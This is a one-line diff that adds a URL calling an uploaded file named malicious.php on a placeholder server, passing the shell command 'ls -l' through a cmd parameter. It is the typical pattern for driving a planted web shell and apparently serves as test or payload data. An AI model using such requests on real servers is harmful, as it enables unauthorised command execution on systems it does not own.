@@ -1,0 +1,1 @@
+-http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l
